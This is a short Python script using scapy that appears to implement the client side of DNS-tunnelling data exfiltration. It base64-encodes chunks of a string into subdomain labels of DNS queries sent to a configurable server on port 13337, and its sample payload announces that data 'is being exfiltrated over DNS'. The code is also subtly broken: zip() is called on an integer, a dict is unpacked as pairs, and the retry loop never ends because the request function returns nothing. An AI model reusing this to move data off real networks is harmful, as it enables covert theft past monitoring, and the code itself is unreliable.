from scapy.layers.inet import IP, UDP
from scapy.packet import Packet
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import sr1

from scapy.all import *  # noqa: F403
from base64 import b64encode

ip = ""
port = 13337
domain = "google.com"


def process(response: Packet):
    if response.haslayer(DNS) and response[DNS].ancount > 0:
        code = str(response[DNS].an.rdata)[-1]
        if int(code) == 1:
            print("Received Successfully.")
        elif int(code) == 2:
            print("Acknowledged end transmission")
        else:
            print("Transmission Error")

        return int(code)


def DNSRequest(sub_domain, tracking):
    global domain
    d = bytes(f"{sub_domain}.{tracking}.{domain}", "utf-8")
    query = DNSQR(qname=d)
    p = IP(dst=bytes(ip, "utf-8")) / UDP(dport=port) / DNS(qd=query)
    result = sr1(p, verbose=False)
    process(result)


chunk_length = 12


def sendData(data):
    chunk_indices = range(0, len(data), chunk_length)

    chunks = {
        chunk_id: (chunk := data[index : min(index + chunk_length, len(data))])
        for index, chunk_id in zip(chunk_indices, len(chunk_indices))
    }

    for id, chunk in chunks:
        print(f"Transmitting {chunk}")
        encoded = b64encode(bytes(chunk, "utf-8"))
        while DNSRequest(encoded, id) != 1:
            continue


data = "This data is being exfiltrated over DNS"
sendData(data)
data = "R"
sendData(data)
